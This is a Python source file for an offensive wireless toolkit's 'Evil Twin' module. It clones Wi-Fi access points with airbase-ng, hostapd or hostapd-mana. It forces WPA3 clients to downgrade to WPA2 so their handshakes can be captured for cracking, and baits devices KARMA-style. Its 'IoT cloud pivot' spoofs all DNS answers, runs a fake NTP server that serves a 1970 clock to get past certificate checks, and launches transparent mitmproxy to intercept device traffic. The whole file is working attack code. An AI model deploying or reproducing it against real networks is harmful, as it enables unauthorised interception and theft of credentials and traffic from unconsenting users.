"""Evil Twin -- clone an AP and lure clients away from the real one.

Three attack shapes wrapped in one screen. Which one to use depends on
what the target network offers:

1. **Airbase-ng (WEP / open / basic WPA2)** -- oldest and simplest. Runs
   in monitor mode, spits fake beacons, accepts any station that tries
   to associate. Fine for open captive-portal-style engagements and
   quick demos. WPA2 works if you already know the PSK and want to
   MITM the traffic; airbase-ng cannot capture a handshake by itself
   in a useful way.

2. **hostapd (WPA2-PSK evil twin)** -- proper AP with our chosen PSK.
   If you *have* the PSK (from PMKID / handshake cracking upstream)
   and want a stable MITM, this is the shape to run. Combined with
   the Deauth module against the real AP, clients migrate cleanly.

3. **hostapd-mana / hostapd WPA2-Transition downgrade against WPA3**
   (Dragonblood #1) -- the AP being cloned advertises WPA3-SAE OR
   WPA3-Transition (WPA2+WPA3 in one BSS). We stand up a twin that
   *only* speaks WPA2-PSK. Clients whose profile still allows WPA2
   drop from SAE to the vulnerable 4-way handshake at our AP; we
   record the pcap so the resulting handshake goes to wpa-sec.

Every mode drops its capture into the central loot store, so the
operator can hand off to the Loot module for offline cracking.
"""
from __future__ import annotations

import os
import re
import time
from pathlib import Path

from gi.repository import Adw, GLib, Gtk

from ..executor import Process, Result, run_async
from ..loot_store import get_loot_store, loot_path
from ..module import NHModule, register
from ..widgets import OutputView, toast

DEFAULT_IFACE = "wlan1mon"
_HANDSHAKE_RE = re.compile(
    r"WPA handshake:\s*([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})")

# hostapd configuration templates. We keep them here rather than in a
# separate resource file because they're short and take substitutions
# for interface / ESSID / channel / PSK.

# Basic WPA2-PSK AP. Works for both a "plain evil twin" and the
# WPA2 leg of a WPA3-transition downgrade.
_HOSTAPD_WPA2_TMPL = """interface={iface}
driver=nl80211
ssid={ssid}
hw_mode={hw_mode}
channel={channel}
wpa=2
wpa_passphrase={psk}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
auth_algs=1
{mana_lines}
"""

# hostapd-mana specific bits. When we use the mana binary we set the
# "loud" flag so it re-broadcasts SSIDs it has seen in probe requests
# -- catches devices with hidden networks in their PNL. Only added
# when the user picks the mana profile.
_MANA_TMPL = ("mana_wifi=1\n"
              "mana_loud=1\n"
              "mana_macacl=0\n"
              "mana_wpaout={pcap}\n")


@register
class EvilTwin(NHModule):
    title = "Evil Twin"
    icon = "network-wireless-encrypted-symbolic"
    description = ("Clone an AP with airbase-ng or hostapd; force WPA3 "
                   "clients to downgrade to WPA2 to capture handshakes.")
    required_tools = ["hostapd"]  # hostapd is always present in Kali

    def __init__(self, app_window):
        super().__init__(app_window)
        self._proc: Process | None = None
        self._pcap_path: str | None = None
        self._loot_id: int | None = None
        self._got_handshake: bool = False

    # ---------------------------------------------------------- build
    def build(self) -> Gtk.Widget:
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        for m in ("top", "bottom", "start", "end"):
            getattr(box, "set_margin_" + m)(12)

        # ---- profile picker
        prof_group = Adw.PreferencesGroup(
            title="Attack profile",
            description="Airbase for quick open/WEP twins; hostapd for "
                        "a proper WPA2 AP; hostapd-mana for the "
                        "WPA3-Transition downgrade or KARMA-loud "
                        "roaming trap.")
        self.profile = Adw.ComboRow(title="Profile")
        self.profile.set_model(Gtk.StringList.new([
            "airbase-ng (open/WEP clone)",
            "hostapd (WPA2-PSK evil twin)",
            "hostapd-mana (WPA3 → WPA2 downgrade + KARMA)",
        ]))
        self.profile.connect(
            "notify::selected", lambda *_: self._on_profile_change())
        prof_group.add(self.profile)
        box.append(prof_group)

        # ---- AP identity
        ap_group = Adw.PreferencesGroup(title="AP identity")
        self.iface = Adw.EntryRow(title="Monitor / AP interface")
        self.iface.set_text(DEFAULT_IFACE)
        ap_group.add(self.iface)
        self.essid = Adw.EntryRow(title="ESSID to clone")
        ap_group.add(self.essid)
        self.bssid = Adw.EntryRow(
            title="BSSID (optional, hostapd only)")
        ap_group.add(self.bssid)
        self.channel = Adw.EntryRow(title="Channel")
        self.channel.set_text("6")
        ap_group.add(self.channel)
        box.append(ap_group)

        # ---- security (only meaningful for hostapd/mana profiles)
        self.sec_group = Adw.PreferencesGroup(
            title="Security",
            description="hostapd needs a passphrase; can be anything "
                        "if you're only trying to catch the M1/M2 "
                        "before the client rejects.")
        self.psk = Adw.PasswordEntryRow(title="PSK (for hostapd)")
        self.psk.set_text("evilnetwork123")
        self.sec_group.add(self.psk)

        self.transition_switch = Adw.SwitchRow(
            title="Force WPA3 → WPA2 downgrade",
            subtitle="Advertise only WPA2 on this BSSID; clients whose "
                     "profile accepts WPA2 will drop from SAE and give "
                     "us a 4-way handshake to capture.")
        self.transition_switch.set_active(False)
        self.sec_group.add(self.transition_switch)
        box.append(self.sec_group)

        # ---- start / stop
        run_group = Adw.PreferencesGroup(title="Session")
        self.state_row = Adw.ActionRow(
            title="Status", subtitle="idle")
        run_group.add(self.state_row)

        self.file_row = Adw.ActionRow(
            title="Capture file",
            subtitle="hostapd-mana writes handshakes here")
        run_group.add(self.file_row)

        run_row = Adw.ActionRow(
            title="Start / Stop AP",
            subtitle="")
        self.start_btn = Gtk.Button(label="Start",
                                    valign=Gtk.Align.CENTER)
        self.start_btn.add_css_class("suggested-action")
        self.start_btn.connect("clicked", lambda _b: self._start())
        run_row.add_suffix(self.start_btn)
        self.stop_btn = Gtk.Button(label="Stop",
                                   valign=Gtk.Align.CENTER)
        self.stop_btn.set_sensitive(False)
        self.stop_btn.connect("clicked", lambda _b: self._stop())
        run_row.add_suffix(self.stop_btn)
        run_group.add(run_row)

        loot_row = Adw.ActionRow(
            title="Loot",
            subtitle="Handshakes captured here go to wpa-sec")
        open_loot = Gtk.Button(label="Open Loot",
                               valign=Gtk.Align.CENTER)
        open_loot.connect(
            "clicked", lambda _b: self.app_window.activate_module(
                "loot", "module:evil_twin"))
        loot_row.add_suffix(open_loot)
        run_group.add(loot_row)

        # ---- IoT cloud pivot ------------------------------------
        # When an IoT device auto-associates to us (because we cloned
        # an SSID in its PNL), its trust in the network extends to
        # DNS and NTP. If we resolve every hostname to us and hand
        # out a 1970 clock, TLS chains that require notBefore-valid
        # certs open up: cameras / DVRs / cheap smart plugs stop
        # rejecting our self-signed cert.
        #
        # The rest of the cloud MITM setup lives outside evil_twin
        # -- dnsmasq for spoof responses, mitmproxy for the actual
        # relay to vendor endpoints -- but the switches here let the
        # operator turn the two easy pieces on with one tap.
        cloud_group = Adw.PreferencesGroup(
            title="IoT cloud pivot",
            description="Once an IoT device associates to this AP, "
                        "make it think it's talking to its vendor "
                        "cloud. DNS + NTP + mitmproxy. Requires the "
                        "AP to be running.")
        self.dns_spoof = Adw.SwitchRow(
            title="Spoof DNS to us",
            subtitle="dnsmasq answers every A/AAAA lookup with the "
                     "AP's own IP (192.168.150.1)")
        cloud_group.add(self.dns_spoof)

        self.ntp_spoof = Adw.SwitchRow(
            title="NTP clock trick",
            subtitle="Serve 1970-01-01 to the device so cert chains "
                     "with modern notBefore dates validate")
        cloud_group.add(self.ntp_spoof)

        mitm_row = Adw.ActionRow(
            title="Launch mitmproxy",
            subtitle="Transparent proxy on :8080; flow log to loot")
        mitm_btn = Gtk.Button(label="Launch",
                              valign=Gtk.Align.CENTER)
        mitm_btn.add_css_class("suggested-action")
        mitm_btn.connect("clicked",
                         lambda _b: self._launch_cloud_mitm())
        mitm_row.add_suffix(mitm_btn)
        cloud_group.add(mitm_row)
        box.append(cloud_group)
        box.append(run_group)

        self.output = OutputView()
        box.append(self.output)

        self._on_profile_change()
        return box

    def _on_profile_change(self) -> None:
        idx = self.profile.get_selected()
        # airbase-ng: no security group needed.
        # hostapd: PSK visible, transition hidden.
        # hostapd-mana: both visible.
        self.sec_group.set_visible(idx != 0)
        self.transition_switch.set_visible(idx == 2)

    # ---------------------------------------------------------- start
    def _start(self) -> None:
        if self._proc is not None and self._proc.running:
            return
        essid = self.essid.get_text().strip()
        if not essid:
            toast(self.app_window, "Set an ESSID first")
            return
        iface = self.iface.get_text().strip() or DEFAULT_IFACE
        channel = self.channel.get_text().strip() or "6"

        idx = self.profile.get_selected()
        if idx == 0:
            self._start_airbase(iface, essid, channel)
        elif idx == 1:
            self._start_hostapd(
                iface, essid, channel, psk=self.psk.get_text(),
                mana=False)
        else:
            self._start_hostapd(
                iface, essid, channel, psk=self.psk.get_text(),
                mana=True)

    def _start_airbase(self, iface: str, essid: str,
                       channel: str) -> None:
        # No handshake capture in this mode; airbase-ng is stateless
        # about that. We still record a loot row so the operator sees
        # the session in the browser.
        stamp = time.strftime("%Y%m%d-%H%M%S")
        cap = loot_path(
            "evil_twin", "airbase-%s-%s.cap"
            % (self._safe(essid), stamp))
        argv = ["airbase-ng", "-e", essid, "-c", channel,
                "-W", "0", "-w", cap, iface]
        self.output.append("$ " + " ".join(argv) + "\n")
        self._pcap_path = cap
        self._loot_id = get_loot_store().record(
            module="evil_twin", type="wifi_capture",
            target=essid, path=cap,
            notes="airbase-ng open AP clone")
        self._proc = Process(
            argv, self._on_line, self._on_done, root=True)
        self._proc.start()
        self._set_state("airbase-ng running")
        self.file_row.set_subtitle(cap)
        self.start_btn.set_sensitive(False)
        self.stop_btn.set_sensitive(True)

    def _start_hostapd(self, iface: str, essid: str, channel: str,
                       psk: str, mana: bool) -> None:
        # hostapd needs 8..63 char PSK. Pad if too short so we at
        # least start (the point of a downgrade attack is to *catch*
        # the client's response, not for them to actually complete).
        if len(psk) < 8:
            psk = (psk + "!!!!!!!!")[:16]
        try:
            ch = int(channel)
        except ValueError:
            ch = 6
        hw_mode = "a" if ch >= 36 else "g"

        stamp = time.strftime("%Y%m%d-%H%M%S")
        prefix = "hostapd_mana" if mana else "hostapd_evil"
        pcap = loot_path(
            "evil_twin",
            "%s-%s-%s.pcap" % (prefix, self._safe(essid), stamp))
        conf = "/tmp/nhp-evil-twin.conf"

        mana_lines = _MANA_TMPL.format(pcap=pcap) if mana else ""
        cfg = _HOSTAPD_WPA2_TMPL.format(
            iface=iface, ssid=essid, hw_mode=hw_mode,
            channel=ch, psk=psk, mana_lines=mana_lines)
        # Add BSSID override if provided (hostapd only)
        bssid = self.bssid.get_text().strip()
        if bssid:
            cfg += "bssid=%s\n" % bssid

        # Write the config as root because /tmp is world-writable but
        # the launched hostapd runs as root anyway; consistent perms.
        # Using printf to avoid heredoc quoting hell.
        b64 = __import__("base64").b64encode(
            cfg.encode()).decode()
        write_cmd = ("printf '%s' | base64 -d > %s"
                     % (b64, conf))
        run_async(["sh", "-c", write_cmd],
                  lambda _r: None, root=True, timeout=5)

        binary = "hostapd-mana" if mana else "hostapd"
        argv = [binary, "-K", conf]  # -K = show WPA passphrases in log

        self.output.append("$ " + " ".join(argv) + "\n")
        self.output.append("--- config ---\n" + cfg + "---\n")

        self._pcap_path = pcap
        self._got_handshake = False
        target_label = essid
        if self.transition_switch.get_active():
            target_label += " (WPA3→WPA2 downgrade)"
        self._loot_id = get_loot_store().record(
            module="evil_twin", type="handshake_pcap",
            target=target_label, path=pcap,
            notes=binary + " evil twin session")

        self._proc = Process(
            argv, self._on_line, self._on_done, root=True)
        self._proc.start()
        self._set_state("%s running" % binary)
        self.file_row.set_subtitle(pcap)
        self.start_btn.set_sensitive(False)
        self.stop_btn.set_sensitive(True)
        GLib.timeout_add_seconds(2, self._tick)

    def _tick(self) -> bool:
        if self._proc is None or not self._proc.running:
            return False
        if self._loot_id is not None:
            get_loot_store().refresh_size(self._loot_id)
        return True

    def _on_line(self, text: str) -> None:
        self.output.append(text)
        m = _HANDSHAKE_RE.search(text or "")
        if m and not self._got_handshake:
            self._got_handshake = True
            bssid = m.group(1)
            toast(self.app_window,
                  "handshake captured for " + bssid)
            if self._loot_id is not None:
                get_loot_store().append_notes(
                    self._loot_id,
                    "handshake seen from " + bssid)

    def _stop(self) -> None:
        if self._proc is not None:
            self._proc.stop()
        self.stop_btn.set_sensitive(False)
        self._set_state("stopping…")

    def _on_done(self, code: int) -> None:
        self.output.append("[exited: %d]\n" % code)
        self._proc = None
        self.start_btn.set_sensitive(True)
        self.stop_btn.set_sensitive(False)
        self._set_state("stopped")
        if self._loot_id is not None:
            get_loot_store().refresh_size(self._loot_id)

    def _set_state(self, text: str) -> None:
        self.state_row.set_subtitle(text)

    def _safe(self, s: str) -> str:
        return re.sub(r"[^A-Za-z0-9_-]+", "_", s) or "target"

    # ---- deep-link contract ---------------------------------
    def _launch_cloud_mitm(self) -> None:
        """Bring up dnsmasq (all A records -> us), an NTP shim that
        answers 1970, and mitmproxy transparent on :8080. All three
        together set up the "device thinks it's on its home Wi-Fi
        and talking to its vendor cloud" fantasy that lets us
        intercept OTA updates, MQTT topics, cloud API calls, and
        the occasional plaintext HTTP fallback.

        Runs in a separate terminal because mitmproxy wants a TTY."""
        script_parts: list[str] = []

        # dnsmasq: bind to the AP's default subnet, answer every
        # hostname with our own IP. We use 192.168.150.1 to avoid
        # clashing with the phone's own LAN.
        if self.dns_spoof.get_active():
            script_parts.append(
                "cat > /tmp/nhp-cloud-dnsmasq.conf <<'EOF'\n"
                "interface=wlan1\n"
                "address=/#/192.168.150.1\n"
                "dhcp-range=192.168.150.10,192.168.150.100,12h\n"
                "log-queries\n"
                "log-facility=/tmp/nhp-cloud-dnsmasq.log\n"
                "EOF\n"
                "ip addr flush dev wlan1 2>/dev/null || true; "
                "ip addr add 192.168.150.1/24 dev wlan1 || true; "
                "ip link set wlan1 up; "
                "pkill -f 'dnsmasq.*nhp-cloud' 2>/dev/null; "
                "dnsmasq -C /tmp/nhp-cloud-dnsmasq.conf "
                "  --pid-file=/tmp/nhp-cloud-dnsmasq.pid; "
            )

        # NTP trick: dead-simple Python UDP server on :123 that
        # answers with a fixed 1970-01-01 timestamp. Some devices
        # will validate cert notBefore before we get to talk to
        # them, which is what breaks the trick when the phone is
        # correctly clocked. Not perfect but well documented.
        if self.ntp_spoof.get_active():
            script_parts.append(
                "cat > /tmp/nhp-cloud-ntp.py <<'PY'\n"
                "import socket, struct, time\n"
                "s = socket.socket(socket.AF_INET, "
                "                    socket.SOCK_DGRAM)\n"
                "s.bind(('0.0.0.0', 123))\n"
                "# NTP fixed reply: LI=0 VN=3 mode=4 (server)\n"
                "# reference/originate/receive/transmit all 0\n"
                "# = 1900-01-01, which is what devices interpret\n"
                "# as 1970-01-01 in the Unix epoch.\n"
                "while True:\n"
                "    data, addr = s.recvfrom(512)\n"
                "    reply = bytearray(48)\n"
                "    reply[0] = 0x1C\n"
                "    s.sendto(bytes(reply), addr)\n"
                "PY\n"
                "pkill -f 'python3 /tmp/nhp-cloud-ntp' 2>/dev/null; "
                "python3 /tmp/nhp-cloud-ntp.py "
                "  > /tmp/nhp-cloud-ntp.log 2>&1 & "
            )

        # mitmproxy transparent. Registers the flow log with loot
        # first so the row is there even if the user never touches
        # it in the UI.
        stamp = time.strftime("%Y%m%d-%H%M%S")
        flow_path = loot_path(
            "evil_twin", "cloud-mitm-%s.flows" % stamp)
        get_loot_store().record(
            module="evil_twin", type="mitm_flows",
            target="cloud pivot",
            path=flow_path,
            notes="IoT cloud MITM: DNS=%s NTP=%s"
                   % (self.dns_spoof.get_active(),
                      self.ntp_spoof.get_active()))
        script_parts.append(
            "term=$(command -v kgx || command -v gnome-terminal "
            "|| command -v xterm || echo xterm); "
            "case $term in "
            "  *kgx*|*gnome-terminal*) "
            "    $term -- sudo mitmproxy --mode transparent "
            "      --set stream_large_bodies=1m -w %s ;; "
            "  *) "
            "    $term -e \"sudo mitmproxy --mode transparent "
            "      --set stream_large_bodies=1m -w %s\" ;; "
            "esac &"
            % (flow_path, flow_path))

        script = "\n".join(script_parts)
        self.output.append("# spinning up cloud MITM\n")
        run_async(["sh", "-c", script], lambda _r: None,
                  root=True, timeout=15)
        toast(self.app_window,
              "Cloud MITM started; flow log at " + flow_path)

    def set_target(self, target: str) -> None:
        """Populate ESSID/BSSID/channel from a caller. Format is
        ``ESSID|BSSID|channel`` (any of the three optional). Called
        by NetDiscovery when the user picks 'Clone this AP'."""
        parts = target.split("|") if target else []
        if len(parts) > 0 and parts[0]:
            self.essid.set_text(parts[0])
        if len(parts) > 1 and parts[1]:
            self.bssid.set_text(parts[1])
        if len(parts) > 2 and parts[2]:
            self.channel.set_text(parts[2])
